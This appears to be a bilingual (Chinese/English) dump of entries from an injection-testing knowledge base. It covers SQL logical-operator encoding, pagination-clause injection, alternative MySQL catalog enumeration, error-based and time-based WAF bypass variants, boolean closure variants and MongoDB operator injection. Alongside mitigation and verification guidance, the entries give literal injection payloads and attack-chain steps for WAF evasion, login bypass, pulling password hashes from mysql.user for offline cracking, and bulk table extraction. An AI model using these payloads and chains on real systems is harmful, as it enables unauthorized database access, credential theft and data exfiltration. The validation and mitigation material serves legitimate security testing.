description.en: Replace equals with LIKE/BETWEEN/IN equivalents in true/false pairs; the true condition matching the 1=1 baseline and the false one differing confirms these operators substitute for blocked equals.

prerequisites.zh: 在 WAF、框架和数据库入口分别捕获原始字节与规范化值，明确百分号解码和关键字清洗的先后顺序。
prerequisites.en: Capture raw bytes and normalized values at the WAF, framework, and database boundaries, documenting percent-decoding and keyword-cleaning order.

prerequisites.zh: 确认目标方言对 &&、|| 的真实含义，并为每个编码或重叠关键字形式准备语义一致的恒真、恒假对照。
prerequisites.en: Confirm the target dialect's actual semantics for && and ||, and prepare semantically matched true and false controls for every encoded or overlapping-keyword form.

analysis.zh: 阳性证据是入口层接受某个变体，后续规范化把它重建成逻辑运算符，并在数据库中产生可重复的真/假结果差异；绕过结论还需规范写法被同一策略拦截。WAF 日志出现字符串、`||` 被解释为连接、清洗后语法错误、或页面仅回显编码值都不是阳性。
analysis.en: Positive evidence is an entry layer accepting a variant, later normalization reconstructing a logical operator, and the database producing a repeatable true/false differential; a bypass claim also requires the canonical form to be blocked by the same policy. A string appearing in WAF logs, || acting as concatenation, a syntax error after cleaning, or reflection of an encoded value is not positive evidence.

opsecTips.zh: 定位到第一个发生语义重建的层和一个稳定差异后停止，不叠加双重编码或其他注入原语。
opsecTips.en: Stop after locating the first layer that reconstructs semantics and one stable differential; do not add double encoding or other injection primitives.

opsecTips.zh: 移除临时原始请求捕获，清除解码缓存和测试规则，并把各层恢复为统一的单次规范化流程。
opsecTips.en: Remove temporary raw-request capture, clear decoder caches and test rules, and restore a consistent single-normalization flow across layers.

name.zh: 逻辑运算符编码与关键词变体

description.zh: 使用 AND/OR 的符号形式、URL 编码和关键词重叠变体，验证过滤器与数据库规范化是否一致。
description.en: Uses symbolic, URL-encoded, and overlapping-keyword forms of AND and OR to test consistent normalization between filters and the database.

overview.zh: 覆盖逻辑运算符编码与关键词变体验证：以 URL 编码（%26%26、%7C%7C）、双写与大小写变体替代 AND/OR 构造恒真条件，检测过滤器与数据库规范化是否一致。
overview.en: Covers logical-operator encoding and keyword variant verification: building always-true conditions with URL encoding (%26%26, %7C%7C), double-writes, and case variants replacing AND/OR, testing filter and database normalization consistency.

vulnerability.zh: 根因是黑名单在解码前匹配、只删除一次关键词或忽略数据库 SQL 模式，把输入转换成有效逻辑运算符；关键词删除式过滤对编码与重叠写法无防御力。
vulnerability.en: The root cause is blacklists matching before decoding, deleting keywords only once, or ignoring database SQL modes, converting input into valid logical operators; keyword-deletion filtering cannot resist encodings and overlapping spellings.

exploitation.zh: 使用第 1 步命令以 URL 编码、双写与大小写变体替代 AND/OR 构造恒真条件；变体行响应与 1=1 基线一致即确认逻辑关键字过滤被绕过。先用标准 AND/OR 真值对确认注入，再一次只替换一种符号、编码或重叠形式并记录每层解码值，核对 WAF、应用与数据库日志共同证明变体被规范化为预期谓词。
exploitation.en: Use the step 1 command to build always-true conditions replacing AND/OR with URL encoding, double-writes, and case variants; variant rows matching the 1=1 baseline confirm logical-keyword filtering is bypassed. Confirm injection with standard AND/OR truth pairs first, then swap one symbol, encoding, or overlap form per attempt recording each decode layer, cross-checking WAF, application, and database logs that variants normalized into the expected predicate.

mitigation.zh: 在应用边界只解码一次，拒绝非规范编码，执行类型校验与参数绑定，禁止关键词删除式过滤；修复后重放各变体应无差异。
mitigation.en: Decode exactly once at the application boundary, reject non-canonical encodings, enforce type validation and parameter binding, and ban keyword-deletion filtering; after the fix, replaying each variant must show no differences.

title.en: Replace logic operators with encoded forms

description.zh: 逻辑词被过滤时改用编码的逻辑符号或直接书写符号形式，解码后语义等价，条件判断照常工作推进利用，继续条件推断。
description.en: Swap filtered AND/OR for URL-encoded && / || or raw symbols; after decoding the logic is equivalent and conditions still evaluate.

title.en: Punch through single-pass deletion with double writes

description.zh: 过滤器只删除一次关键字时提交双写形态，删除中段后剩余字符恰好拼回原词，逻辑词恢复生效继续推进利用，通道随即恢复。
description.en: Submit anandd/oorr double writes; one deletion pass leaves the reassembled keyword fully functional.

title.en: Restore the blind chain with rebuilt conditions

description.zh: 用替代运算符重组恒真恒假条件对提交，响应差异恢复可区分后，接入既有逐位提取流程继续推断数据内容，批量拉取数据。
description.en: Recompose tautology/falsehood pairs with the substitutes; once responses separate again, resume the existing per-bit extraction flow.

review.rationale: 内容是逻辑运算符规范化验证载荷，应保留在 SQL 注入分类。

prerequisites.zh: 确认具体 DBMS 的 LIMIT/OFFSET 或 FETCH 语法，以及用户参数是否被拼接到分页子句而非正常绑定。
prerequisites.en: Confirm the DBMS-specific LIMIT/OFFSET or FETCH syntax and whether user input is concatenated into the pagination clause rather than normally bound.

prerequisites.zh: 在具有固定排序的测试表中准备编号标记行，并保存应用合法分页 API 对相同数据集的基线窗口。
prerequisites.en: Prepare numbered marker rows in a test table with deterministic ordering, and retain the application's legitimate pagination baseline for the same dataset.

analysis.zh: 阳性是输入改变了后端分页子句，使返回窗口与固定标记行和 SQL 审计完全对应，且超出该参数正常允许的页码或大小语义。正常分页功能、未固定排序导致的行漂移、缓存命中、语法错误或不同方言拒绝 FETCH 不是注入证明。
analysis.en: A positive result is input altering the backend pagination clause so the returned window exactly matches numbered markers and SQL auditing, beyond the parameter's legitimately allowed page or size semantics. Normal pagination, row drift from nondeterministic ordering, cache hits, syntax errors, or another dialect rejecting FETCH does not prove injection.

opsecTips.zh: 两个相邻受控窗口已证明边界可控后停止，不扩大 LIMIT 以导出完整数据集。
opsecTips.en: Stop after two adjacent controlled windows prove that the boundary is controllable; do not enlarge LIMIT to export the full dataset.

opsecTips.zh: 删除编号标记行，清除分页和响应缓存，并恢复页大小上限、排序白名单及参数绑定。
opsecTips.en: Delete numbered marker rows, clear pagination and response caches, and restore page-size limits, sort allowlists, and parameter binding.

name.zh: 行限制与分页子句注入

description.zh: 覆盖 LIMIT/OFFSET 和 FETCH FIRST/NEXT 分页语法，验证输入能否控制返回行范围。
description.en: Covers LIMIT/OFFSET and FETCH FIRST/NEXT pagination syntax to test whether input can control the returned row range.

overview.zh: 覆盖行限制与分页子句注入验证：以 LIMIT/OFFSET 与 FETCH FIRST/NEXT 变体改写行限制，检测输入能否控制返回行范围。需先匹配实际数据库的分页语法。
overview.en: Covers row-limit and pagination-clause injection verification: rewriting row limits with LIMIT/OFFSET and FETCH FIRST/NEXT variants to test whether input controls returned row ranges, matching the actual database pagination syntax first.

vulnerability.zh: 根因是开发者常假定 LIMIT/OFFSET 只接数字而直接拼接，忽略驱动绑定与服务端整数转换，导致输入改变结果窗口；不同 DBMS 分页语法不同需先匹配。
vulnerability.en: The root cause is developers assuming LIMIT/OFFSET take only numbers and concatenating directly, ignoring driver binding and server-side integer conversion so input shifts the result window; pagination syntax differs per DBMS and must be matched first.

exploitation.zh: 使用第 1 步命令以 LIMIT/OFFSET/FETCH 变体改写行限制并观察返回行数；返回行数随注入值变化即确认分页子句可注入。先用合法页码记录对象 ID、排序与最大页大小，再提交两个方言正确的行窗口及一个越界负对照；同一授权查询的返回行范围被输入稳定控制并对应最终 SQL 才成立。
exploitation.en: Use the step 1 command to rewrite row limits with LIMIT/OFFSET/FETCH variants observing returned row counts; row counts varying with injected values confirm injectable pagination clauses. Record object IDs, ordering, and maximum page size with legitimate page numbers first, then submit two dialect-correct row windows plus one out-of-range negative control; it stands only when the authorized query's row range is stably input-controlled and matches final SQL.

mitigation.en: Parse page numbers, sizes, and offsets into bounded integers before binding, allowlist ordering fields, and apply maximum row caps after authorization filters; after the fix, replaying pagination variants must show no row-count differences.

description.zh: 注入分页与偏移子句调整结果窗口，逐行定位输出内容位置，为精确读取目标行数据建立起可控的翻页能力，逐行读出内容。
description.en: Inject LIMIT and OFFSET to slide the result window row by row, building pagination for precise target reads.

attackChain.payload:
1' LIMIT 1 OFFSET 0--
1' LIMIT 0,1--
1' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
1' FETCH FIRST 1 ROWS ONLY--

title.zh: 取数子句变体适配数据库

description.zh: 目标为标准方言时换用偏移取数形态提交，语义与分页子句完全等价，覆盖不同引擎的分页语法继续控制输出，翻页继续读取。
description.en: On standard dialects use OFFSET ROWS FETCH NEXT forms; equivalent to LIMIT, they cover engines with different pagination syntax.

attackChain.payload:
1' LIMIT 1 OFFSET 0--
1' LIMIT 0,1--
1' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
1' FETCH FIRST 1 ROWS ONLY--

title.zh: 配合 UNION 精确提取
title.en: Pair with UNION for precise dumps

description.zh: 与联合查询回显结合按页翻取整表内容，锁定敏感行后逐行输出数据，完成可控粒度的目标数据提取任务，逐页直至收齐。
description.en: Combine with UNION echo to page through whole tables, pinpointing sensitive rows and dumping at controlled granularity.

review.rationale: 这是分页语法位置的 SQL 载荷，不是数据库客户端命令参考。

description.zh: 绕过按空格分词识别 LIMIT 的规则：子句值括号化紧排；行集按预期截断即成功。
description.en: Parenthesize clause values with no spaces against space-tokenized LIMIT detection; the rowset truncating as expected confirms success.

description.zh: 绕过对 OFFSET 关键字的过滤：改用逗号分页语法并注释分词；单行结果返回即成功。
description.en: Use comma pagination instead of OFFSET keywords with comment splitting; a single-row result confirms success.

description.zh: 绕过对 OFFSET FETCH 整句特征的匹配：FETCH 与行数子句注释分离；受限行集返回即成功。
description.en: Comment-separate FETCH and row-count clauses against whole-phrase matching; a restricted rowset returning confirms success.

title.en: Validation step 1 for Row-Limit and Pagination-Clause Injection

execution.command:
1' LIMIT 1 OFFSET 0--
1' LIMIT 0,1--
1' OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
1' FETCH FIRST 1 ROWS ONLY--

description.zh: 以 LIMIT/OFFSET/FETCH 变体改写行限制并观察返回行数；返回行数随注入值变化即确认分页子句可注入。
description.en: Rewrite row limits with LIMIT/OFFSET/FETCH variants and watch the returned row count; the count changing with the injected value confirms the pagination clause is injectable.

prerequisites.zh: 确认目标为兼容 MySQL 系统目录的数据库，并核对测试账户对 mysql、sys、performance_schema 的实际只读权限。
prerequisites.en: Confirm a database with MySQL-compatible catalogs and verify the test account's actual read-only privileges on mysql, sys, and performance_schema.

prerequisites.zh: 建立仅含随机名称的合成 schema、表或视图作为标记，不使用真实账户、生产表名或业务元数据。
prerequisites.en: Create a synthetic schema, table, or view with a random name as the marker, without using real accounts, production table names, or business metadata.

analysis.zh: 阳性要求替代目录查询经已确认的注入点返回合成对象标记，并由数据库审计证实访问了对应目录；若主张黑名单绕过，还应显示 information_schema 形式被拦截。目录访问被拒绝、表不存在、WAF 放行但无标记、普通应用元数据或猜测到常见表名都是假阳性。
analysis.en: Positive evidence requires an alternative-catalog query to return the synthetic object marker through the confirmed injection point, with database auditing showing access to that catalog; a blacklist-bypass claim should also show the information_schema form being blocked. Access denial, missing tables, WAF acceptance without a marker, ordinary application metadata, or guessing a common table name are false positives.

opsecTips.zh: 第一个合成目录标记返回后停止，不枚举 mysql.user、会话历史或生产 schema。
opsecTips.en: Stop after the first synthetic catalog marker is returned; do not enumerate mysql.user, session history, or production schemas.

opsecTips.zh: 删除合成对象，撤销临时目录权限，刷新元数据缓存并清理包含随机名称的查询记录。
opsecTips.en: Drop synthetic objects, revoke temporary catalog grants, refresh metadata caches, and clear query records containing the random name.

name.zh: 替代系统目录枚举注入

description.zh: 使用 mysql、sys 和 performance_schema 的替代目录对象，验证仅屏蔽 information_schema 的不完整防护。
description.en: Uses alternative catalog objects in mysql, sys, and performance_schema to test controls that block only information_schema.

overview.zh: 覆盖 information_schema 被屏蔽后的替代目录枚举验证：改从 mysql.user、sys 与 performance_schema 等替代目录读取，检测仅屏蔽单个目录名的不完整防护。
overview.en: Covers alternative-catalog enumeration when information_schema is blocked: reading instead from mysql.user, sys, and performance_schema to detect incomplete defenses that block only a single catalog name.

vulnerability.zh: 根因是查询仍被拼接且 WAF 只禁止 information_schema 时其他系统视图可替代；过宽 SELECT 权限扩大元数据泄露，阻断单个目录名不能修复 SQL 注入。
vulnerability.en: The root cause is queries still concatenated while the WAF bans only information_schema, leaving other system views as substitutes; overly broad SELECT privileges widen metadata disclosure, and blocking one catalog name fixes nothing about SQL injection.

exploitation.zh: 使用第 1 步命令改从 mysql.user、sys、performance_schema 等替代目录读取；任一目录返回数据即确认 information_schema 被禁时仍存在枚举路径。先确认 MySQL 版本与业务账户权限，使用列数兼容的固定常量查询，对比单目录拦截与替代目录响应；以固定无敏感标记或权限结果验证，不枚举真实账户。
exploitation.en: Use the step 1 command to read instead from alternative catalogs like mysql.user, sys, and performance_schema; any catalog returning data confirms enumeration paths persist with information_schema blocked. Confirm the MySQL version and business-account privileges first, query with column-count-compatible fixed constants comparing single-catalog blocks against alternatives, and verify with fixed non-sensitive markers or permission results — never enumerate real accounts.

mitigation.zh: 参数化查询、允许列表映射动态表名，撤销业务账户对 mysql、sys 与 performance_schema 的非必需权限并监控跨模式读取；修复后重放替代目录查询应无数据返回。
mitigation.en: Parameterize queries with allowlist-mapped dynamic table names, revoke non-essential business-account privileges on mysql, sys, and performance_schema, and monitor cross-schema reads; after the fix, replaying alternative-catalog queries must return no data.

title.en: Query the system account table directly

description.zh: 系统目录视图被禁时改查数据库自有账户表，联合查询读取账户与口令哈希列，绕开目录封锁拿到凭据材料，供直连使用。
description.en: With information_schema banned, query mysql.user directly via UNION to pull account names and password hashes.

title.zh: 性能视图替代枚举结构

description.zh: 换性能与统计类视图获取表名与访问信息，同样绕过目录封锁，完成库表结构侦察并得到数据提取路线图，锁定提取目标。
description.en: Pivot to sys.schema_table_statistics and performance_schema views for table names and stats, sidestepping the catalog lockdown.

description.zh: 结合前两步定位的表与列构造查询，提取口令哈希与业务数据，离线破解后即可直连数据库横向扩展战果，完成横向渗透。
description.en: Build queries from the located tables and columns to dump hashes and business data; cracked credentials enable direct connections.

review.rationale: 这是系统目录黑名单缺口的注入载荷，不是元数据枚举工具说明。

prerequisites.zh: 确认 MySQL 或兼容版本，并建立每个报错函数在该版本中是否可用、是否废弃的功能矩阵。
prerequisites.en: Confirm the MySQL or compatible-server version and build a matrix showing which error functions are available or deprecated on that version.

prerequisites.zh: 先用一个低风险固定表达式证明基础报错通道，再逐个替换函数，并采集 WAF 决策、数据库错误和应用脱敏结果。
prerequisites.en: First prove the base error channel with one low-risk fixed expression, then substitute functions individually while collecting WAF decisions, database errors, and application redaction results.

analysis.zh: 阳性是某个版本兼容函数在规范形式被拦截时仍执行受控表达式，并让随机标记进入数据库错误通道，因果链可由 WAF 与数据库日志关联。函数不存在、参数类型错误、普通 500、错误页只显示函数名、或响应差异来自异常模板都属于假阳性。
analysis.en: Positive evidence is a version-compatible function executing a controlled expression despite the canonical form being blocked and carrying a random marker into the database error channel, with WAF and database logs establishing causality. A missing function, argument-type error, generic 500, an error page showing only the function name, or response differences from an exception template are false positives.

opsecTips.zh: 一个函数变体成功传递随机标记后停止，不轮询整套函数或把用户、版本、目录值放入错误中。
opsecTips.en: Stop after one function variant carries the random marker; do not cycle through the full set or place user, version, or catalog values in errors.

opsecTips.zh: 恢复统一错误页和 WAF 测试策略，删除标记数据、请求追踪与详细数据库异常，并刷新应用错误缓存。
opsecTips.en: Restore uniform error pages and WAF test policy, delete marker data, request traces, and verbose database exceptions, and refresh application error caches.

name.zh: MySQL 报错型注入的 WAF 变体
name.en: WAF Variants for MySQL Error-Based Injection

description.zh: 聚焦重复键、XML、GTID、JSON、地理与条件函数形成的报错或真假通道，验证 WAF 规则覆盖。
description.en: Focuses on duplicate-key, XML, GTID, JSON, geospatial, and conditional function channels to test WAF coverage.

subCategory.zh: 报错注入 WAF 变体

overview.zh: 覆盖 MySQL 报错注入在 WAF 环境下的变体验证：以 8 种报错函数标准形式建立无 WAF 基线，作为后续 WAF 变体复测的对照，验证 WAF 规则覆盖的完整性。
overview.en: Covers MySQL error-based injection variants under WAFs: establishing a WAF-free baseline with eight standard error-function forms as the control for later WAF-variant retests, verifying WAF rule coverage completeness.

vulnerability.zh: 根因是 WAF 只匹配固定函数而应用仍拼接 SQL，其他能产生异常或条件差异的函数可绕过单一签名；不同函数提供同一报错证据通道但可用性随版本变化。
vulnerability.en: The root cause is WAFs matching fixed functions while applications still concatenate SQL, letting other exception- or condition-differencing functions bypass single signatures; different functions share one error-evidence channel but availability varies by version.

exploitation.zh: 使用第 1 步命令以 8 种报错函数标准形式注入；错误信息回显版本号即确认报错注入在无 WAF 时可用，作为后续 WAF 变体的对照基线。建立固定常量错误基线后，再一次选择一个版本兼容函数并构造成功与失败条件，比较 WAF 与 MySQL 错误码；数据库日志须证明函数到达后端并产生受控差异，仅穿过 WAF 不算绕过。
exploitation.en: Use the step 1 command to inject with eight standard error-function forms; a version string echoed in errors confirms error-based injection works WAF-free, serving as the control baseline for later WAF-variant retests. After the fixed-constant error baseline, pick one version-compatible function at a time building success and failure conditions, comparing WAF and MySQL error codes; database logs must prove the function reached the backend and produced controlled differences — passing the WAF alone is not a bypass.

mitigation.zh: 参数化查询、统一对外错误并限制权限；WAF 以解析后的查询结构与异常行为补充检测，而非维护函数黑名单；修复后重放各函数应被统一处理。
mitigation.en: Parameterize queries, unify external errors, and restrict privileges; WAFs should supplement detection with parsed query structure and anomalous behavior rather than maintaining function blacklists; after the fix, replaying each function must be handled uniformly.

description.zh: 先按原样提交报错注入语句，观察拦截与回显的具体情况，摸清当前防护对报错型注入的覆盖范围与拦截力度，定位拦截点。
description.en: Fire the FLOOR and EXTRACTVALUE statements as-is; interception or echo reveals how the defense covers error-based injection.

description.zh: 逐个换同族报错函数重试提交探测，函数名特征不同拦截表现各异，找到未被规则覆盖的报错通道继续利用，继续读取数据。
description.en: Rotate UPDATEXML-family functions one by one; differing name signatures yield different blocks, exposing an uncovered channel.

title.zh: 与标准形态逐段比对定位拦截点
title.en: Diff against the standard form to locate the block

description.zh: 以未变形语句为参照逐段改写比对，二分定位触发拦截的具体片段，针对性变形后恢复数据回显提取通道，恢复数据回显。
description.en: Against the unmodified statement, bisect which fragment trips the rule, reshape only that piece, and restore data echo.

review.rationale: 这是 MySQL 报错函数注入变体，不是 WAF 扫描器或字典工具。

prerequisites.zh: 在确认的 MySQL 版本上验证 SLEEP、IF、BENCHMARK 与派生表语法，并限制测试账户的查询时间和并发。
prerequisites.en: Verify SLEEP, IF, BENCHMARK, and derived-table syntax on the confirmed MySQL version, and cap query time and concurrency for the test account.

prerequisites.zh: 建立低延迟恒真/恒假交错采样、正常网络抖动分布以及带连接标签的数据库会话观测。
prerequisites.en: Establish low-delay interleaved true/false samples, a normal network-jitter distribution, and tagged database-session observability.

analysis.zh: 阳性要求某个嵌套变体相对恒假对照产生统计显著且可重放的延迟，并在数据库会话中看到相应函数执行；若声称 WAF 绕过，规范形式还必须被同一策略阻止。单次慢响应、BENCHMARK 的主机负载、锁竞争、连接池排队或 WAF 自身延迟均是假阳性。
analysis.en: A positive result requires one nested variant to create a statistically significant, replayable delay versus the false control, with the corresponding function visible in database sessions; a WAF-bypass claim also requires the canonical form to be blocked by the same policy. One slow response, host load from BENCHMARK, lock contention, connection-pool queueing, or WAF latency is a false positive.

opsecTips.zh: 首个变体达到预设置信度后停止，禁止增加延时、BENCHMARK 次数或并行连接。
opsecTips.en: Stop after the first variant reaches the predefined confidence level; do not increase delay, BENCHMARK iterations, or parallel connections.

opsecTips.zh: 终止仍在 sleep/benchmark 的会话，排空测试连接池，恢复执行时限并删除 WAF 与性能采样记录。
opsecTips.en: Terminate sessions still in sleep or benchmark, drain the test connection pool, restore execution limits, and delete WAF and performance-sampling records.

name.zh: MySQL 时间盲注的 WAF 变体
name.en: WAF Variants for MySQL Time-Based Blind Injection

description.zh: 使用派生表、SLEEP、IF 和 BENCHMARK 的不同表达式位置建立时间信号，验证 WAF 与 MySQL 解析差异。
description.en: Uses derived tables, SLEEP, IF, and BENCHMARK in different expression positions to build timing signals and test WAF/MySQL parsing differences.

subCategory.zh: 时间盲注 WAF 变体

overview.zh: 覆盖 MySQL 时间盲注在 WAF 环境下的变体验证：以 SLEEP/BENCHMARK 标准形式建立无 WAF 基线，派生表与条件函数等不同嵌套位置复测，验证 WAF 与 MySQL 解析差异。
overview.en: Covers MySQL time-based blind injection variants under WAFs: establishing a WAF-free baseline with standard SLEEP/BENCHMARK forms, retesting across nested positions like derived tables and conditional functions to verify WAF versus MySQL parsing differentials.

vulnerability.zh: 根因是拼接式 MySQL 表达式允许昂贵函数进入派生表或条件函数，固定位置签名无法覆盖等价嵌套；弱查询超时还会放大时间盲注的资源影响。
vulnerability.en: The root cause is concatenated MySQL expressions letting expensive functions enter derived tables or conditional functions while fixed-position signatures miss equivalent nestings; weak query timeouts further amplify timing blind injection's resource impact.

exploitation.zh: 使用第 1 步命令以 SLEEP/BENCHMARK 标准形式注入；响应延迟约 3 秒即确认时间盲注在无 WAF 时可用，作为后续 WAF 复测的对照基线。交错采集正常、恒真和恒假短延时样本，每种嵌套位置只验证一次；BENCHMARK 仅用低迭代数观察趋势，数据库会话或慢查询日志应只在恒真分支显示延时函数。
exploitation.en: Use the step 1 command to inject with standard SLEEP/BENCHMARK forms; roughly three-second response delays confirm timing blind injection works WAF-free, serving as the control baseline for later WAF retests. Interleave normal, always-true, and always-false short-delay samples, verifying each nesting position once; use only low BENCHMARK iteration counts for trends, with database sessions or slow-query logs showing delay functions on the always-true branch only.

mitigation.zh: 参数化查询并设置语句超时、资源组与并发上限；统一解码后将异常函数结构作为 WAF 补充信号；修复后重放各嵌套变体应无统计延迟差异。
mitigation.en: Parameterize queries with statement timeouts, resource groups, and concurrency caps; feed abnormal function structures to the WAF as supplementary signals after unified decoding; after the fix, replaying nested variants must show no statistical delay differences.

title.en: Probe with the standard delay payload

description.zh: 提交延迟子查询与条件组合的标准语句，观察延迟是否出现及是否被拦截，评估时间盲注可行性与防护的强度，选定变形方向。
description.en: Fire the standard SLEEP-subquery and IF combos; observed delay versus block gauges both feasibility and defense strength.

description.zh: 换基准压测与前缀位置等变体重试提交，负载特征不同绕过表现不同，任一变体产生延迟即通道保持可用，盲注继续推进。
description.en: Try BENCHMARK and OR-prefixed variants; differing signatures yield different bypass outcomes, and any delay keeps the channel open.

title.zh: 逐段比对定位拦截片段
title.en: Bisect to find the intercepted fragment

description.zh: 以未变形语句为参照把载荷切段改写比对，定位真正触发规则的片段，仅对其实施变形降低连带失败的影响，最小化副作用。
description.en: Using the standard statement as reference, cut the payload into segments and bisect which piece triggers the rule, reshaping only it.

description.zh: 对通过检测的变体接入自动化脚本按位猜测内容，记录延迟分支还原数据，批量完成库表数据收割的闭环，直至收齐数据。
description.en: Feed the surviving variant to a scripted per-character loop, log delay branches, and bulk-recover schema and data.

review.rationale: 这些是 MySQL 时间函数请求载荷，不应迁到 WAFW00F 或 SQLMap 工具卡。

prerequisites.zh: 确认目标 DBMS 支持的引号与注释约定，并从应用查询或错误日志确定所需括号深度。
prerequisites.en: Confirm the target DBMS's quote and comment conventions, and determine the required parenthesis depth from application query or error logs.

prerequisites.zh: 对每个闭合候选只改变一个语法元素，并准备同一闭合下的恒真、恒假与正常请求三组样本。
prerequisites.en: Change only one syntax element per closure candidate and prepare true, false, and normal samples under the same closure.

analysis.zh: 阳性证据是最小引号、括号和注释组合使恒真谓词恢复预期标记行，而恒假谓词稳定排除该行，后端查询记录同时显示闭合成功。两个分支都报错、两个分支都返回相同页面、注释符仅被回显、或一次状态码变化不属于布尔盲注证据。
analysis.en: Positive evidence is the minimal quote, parenthesis, and comment combination restoring an expected marker row for the true predicate while the false predicate reproducibly excludes it, with backend query records showing successful closure. Both branches erroring, both returning the same page, a reflected comment token, or one status-code change is not Boolean-blind evidence.

opsecTips.zh: 确定一个最小闭合和一组真/假差异后停止，不继续增加括号、分号或替换注释风格。
opsecTips.en: Stop after determining one minimal closure and one true/false differential; do not add parentheses, semicolons, or alternate comment styles.

opsecTips.zh: 回滚标记数据，清除测试响应缓存与详细 SQL 日志，并恢复统一错误处理和参数绑定。
opsecTips.en: Roll back marker data, clear test response caches and verbose SQL logs, and restore uniform error handling and parameter binding.

name.zh: 布尔条件与闭合变体

description.zh: 组合井号、双连字符、分号与不同括号闭合方式，用真假条件定位字面量和嵌套查询边界。
description.en: Combines hash comments, double hyphens, semicolons, and parenthesis closures with true and false predicates to locate query boundaries.

overview.zh: 覆盖布尔条件与闭合方式的组合探测：井号、双连字符、分号注释与单/双括号闭合变体配合恒真恒假条件，定位字面量与嵌套查询边界。适用于已确认存在注入但闭合方式未知的场景。
overview.en: Covers combined probing of boolean conditions and closure styles: hash, double-dash, and semicolon comments plus single/double parenthesis closure variants paired with always-true/false conditions to locate literal and nested-query boundaries. Suitable when injection exists but the closure style is unknown.

vulnerability.zh: 根因是字符串拼接允许输入关闭字面量、注释剩余 SQL 或补齐嵌套括号；不同 DBMS 对注释尾随空白与分号规则不同，闭合方式错误时注入会静默失败。
vulnerability.en: The root cause is string concatenation letting input close literals, comment out remaining SQL, or balance nested parentheses; DBMS rules for trailing comment whitespace and semicolons differ, and a wrong closure makes injection fail silently.

exploitation.zh: 按第 1 步命令逐行提交 AND/OR 恒真条件与不同闭合变体（'、')、')) 及多种注释符）；与 1=2 对照行出现稳定响应差异即确认对应闭合与逻辑形式可注入。对每种闭合深度同时发送恒真/恒假两行，每次只增加一个右括号并记录错误位置。
exploitation.en: Follow step 1 to submit AND/OR always-true conditions with different closure variants (', '), ')) and multiple comment markers line by line); a stable response difference against the 1=2 control row confirms that closure and logic form are injectable. Send true/false pairs for each closure depth, adding one right parenthesis at a time and recording error positions.

mitigation.zh: 参数化查询并对数字、枚举做服务端类型转换，不依赖转义或注释黑名单；修复后重放各闭合变体响应应无差异，并对已识别的闭合深度全部回归。
mitigation.en: Parameterize queries with server-side type conversion for numbers and enums, avoiding escapes or comment blacklists; after the fix, replaying all closure variants must show no response differences, with full regression over identified closure depths.

title.en: Probe with tautologies and comment closures

description.zh: 提交恒真条件配合井号与双横线注释收尾，闭合并丢弃尾随语法，页面行为变化即确认注入点与注释均可用，注入点随即可用。
description.en: Submit 1' AND 1=1 with # or -- - closers; the comment sheds trailing syntax and behavior changes confirm both injection and comments.

description.zh: 换带括号前缀的变体匹配外层包裹结构，命中真实层级后恒真条件恢复生效，扩大可用注入形态的覆盖范围，适配深层嵌套。
description.en: Try ') and ')) prefixes to match outer wrapping; hitting the real nesting revives the tautology and widens usable forms.

title.zh: OR 恒真绕过数据校验

description.zh: 用恒真变体让校验条件整体成立，登录或过滤逻辑被短路绕过，直接拿到本不可达的数据与功能页面权限，权限随即扩大。
description.en: OR '1'='1 variants short-circuit checks into tautologies, reaching pages and data otherwise gated off.

title.en: Pivot into deep extraction once confirmed

description.zh: 注入点稳固后切换联合查询或盲注载荷，按数据库类型接入对应提取链，把库结构与数据逐层搬出完成利用，完成数据外带。
description.en: With the foothold stable, switch to UNION or blind payloads and run the DB-specific chain to walk out schema and data.

review.rationale: 原字符串均为同一布尔闭合技术的 Payload，已去除来源品牌化命名。

description.zh: 绕过对注释符前必须空格的解析假设：用 && 短路接注释收尾；真值条件响应与基线一致即成功。
description.en: Chain a short-circuit && into the closing comment against spacing assumptions; a true-condition response matching baseline confirms success.

description.zh: 探测反引号上下文并绕过引号过滤：直接反引号闭合后接条件；数据库报错语义变化即成功。
description.en: Close with a backtick to probe identifier contexts under quote filtering; a changed error semantics confirms success.

description.zh: 绕过把 -- 后内容整行丢弃的单行解析器：注释后接换行使后续条件落到下一行被解析；条件差异出现即成功。
description.en: Follow the comment with a newline so trailing conditions survive single-line parsers; an appearing conditional difference confirms success.

prerequisites.zh: 使用独立 MongoDB 测试集合和合成账户，确认 API 是否把 JSON 对象直接传给驱动及其操作符清洗配置。
prerequisites.en: Use an isolated MongoDB test collection and synthetic accounts, confirming whether the API passes JSON objects directly to the driver and how operators are sanitized.

prerequisites.zh: 开启带请求令牌的命令审计或短期 profiler，并为 $ne、$gt、$regex、$exists 和 $where 准备匹配与不匹配对照。
prerequisites.en: Enable request-token command auditing or a short-lived profiler, and prepare matching and nonmatching controls for $ne, $gt, $regex, $exists, and $where.

analysis.zh: 阳性是原本应为标量的字段被解析为 MongoDB 操作符对象，使查询命中只能由合成标记识别的文档或绕过测试账户的恒假凭据，并由数据库命令记录确认。JSON 被接受、返回 400、正则耗时、输入回显、或普通空密码测试成功都不是操作符注入证据。
analysis.en: Positive evidence is a field expected to be scalar being parsed as a MongoDB operator object and matching a uniquely marked synthetic document or bypassing a deliberately false test credential, confirmed by database command records. JSON acceptance, HTTP 400, regex latency, input reflection, or success with an ordinary blank-password test is not operator-injection evidence.

opsecTips.zh: 第一个合成文档或测试账户匹配后停止，不在大型集合运行 $where 或无界正则，也不读取真实用户记录。
opsecTips.en: Stop after the first synthetic document or test-account match; do not run $where or unbounded regex against a large collection or read real user records.

opsecTips.zh: 删除测试集合与合成账户，关闭 profiler，清除审计令牌，并恢复操作符白名单和输入 schema。
opsecTips.en: Drop the test collection and synthetic accounts, disable the profiler, clear audit tokens, and restore operator allowlists and the input schema.

name.zh: MongoDB 查询运算符注入变体集

description.zh: 用 $gt、$ne、$regex、$exists、$where 和逻辑对象替换预期标量，验证 JSON 是否直接变成 MongoDB 条件。
description.en: Replaces expected scalars with $gt, $ne, $regex, $exists, $where, and logical objects to test whether JSON becomes MongoDB criteria.

overview.zh: 覆盖 MongoDB 查询运算符注入的探测与绕过：$gt/$ne/$regex/$exists/$where 与逻辑对象替换预期标量，区分 JSON 对象运算符注入与旧式 $where 字符串注入。适用于接口期望字符串却接受对象的场景。
overview.en: Covers probing and bypass via MongoDB query operator injection: $gt/$ne/$regex/$exists/$where and logical objects replacing expected scalars, separating JSON object operator injection from legacy $where string injection. Suitable when an API expects strings but accepts objects.

